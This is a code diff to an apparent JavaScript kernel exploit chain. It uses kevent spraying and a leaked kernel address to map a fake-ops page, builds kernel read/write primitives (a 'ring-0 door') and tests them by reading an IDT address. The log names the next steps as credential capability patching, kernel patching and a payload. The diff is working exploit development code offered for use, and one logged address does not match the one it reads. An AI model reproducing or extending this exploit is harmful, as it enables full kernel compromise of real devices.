@@ -1,7 +1,6 @@
 import { int64 } from "./int64.js";
-// v12: write-landing diagnostic — after every plant, diff ALL armed victims vs template.
-//     KV-DIFF shows victim/offset/got-values for ANY change; KV-SCANRES summarizes.
-//     ?full=1 widens candidates to every spray fd. Also keeps the ?probe=fixed MAP_FIXED probe.
+// v13: stages 3-6 wired (fakeops+rotations+kread/kwrite door)
+//     (v12 diagnostic KV-DIFF/KV-SCANRES kept; ?full=1 widens candidates; ?probe=fixed kept)
 import { HX1400_TABLES } from "./hx_tables.js";
 
 // ============================================================================
@@ -185,7 +184,7 @@ function phaseB1(dceDev) {
   const st = stBuf();
   const dceFd = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
   if (dceFd < 0) fin("B1 dce open failed");
-    if (!fstatOk(dceFd, st)) fin("B1 dce fstat failed");
+  if (!fstatOk(dceFd, st)) fin("B1 dce fstat failed");
   const ino = stIno(st);
   if (ino === 0) fin("our own /dev/dce has no usable st_ino - refusing to guess");
   log("B1", "dce_fd=" + dceFd + " ino=" + h16(BigInt(ino)));
@@ -433,6 +432,23 @@ export async function runKevent(c) {
 
   const res = phase2Leak(leakKq, fds, dceDev, tpl);
   log("SLOT", "R_SLOT=" + h16(ka(P[13])) + " R_OPS=" + h16(ka(P[14])));
-  fin("stage2 DONE (kva held). Next: one-time EV_ADD -23 + fakeops build (bytecode pc 6760-9200)");
+
+  // ---- stage 3+: fakeops page + plant + rotations + ring-0 door ----
+  const krw = await import("./hx_krw.js?v=2");
+  const fpage = (((res.kva & 0xffffn) << 16n) | 0x9800n) & ~0x3fffn;
+  const mr2 = scn64("mmap", fpage, 0x4000, 3, 0x1012, -1, 0);
+  const got = (BigInt(mr2.hi >>> 0) << 32n) | BigInt(mr2.lo >>> 0);
+  log("FAKEOPS-MMAP", "want=" + h16(fpage) + " got=" + h16(got) + (got === fpage ? " OK" : " FAIL"));
+  if (got !== fpage) fin("fakeops mmap fixed failed got=" + h16(got));
+
+  krw.bindPage(fpage);
+  const kq2 = krw.armRootKq();
+  const kva2 = krw.stage3(res.kva);
+  krw.stage4(kva2, res.targetFd);
+
+  // door sanity: kread the IDT base gate (known kernel address)
+  const idtv = krw.kread8(0xffffff8000001a00n);
+  log("KREAD-IDT", "0xffffffff80001a00 -> " + h16(idtv));
+  fin("stage3-6 DONE (door live). Next: ucred caps -> kpatch -> payload");
 }
-export function hxBridge() { return { scn, scn64, allocBuf, zeroBuf, log, fin, ka, h16, P: T.P, getKbase: () => STATE.kbase }; }
+export function hxBridge() { return { scn, scn64, allocBuf, zeroBuf, log, fin, ka, h16, P: T.P, getKbase: () => STATE.kbase, p: ctx().p, int64 }; }
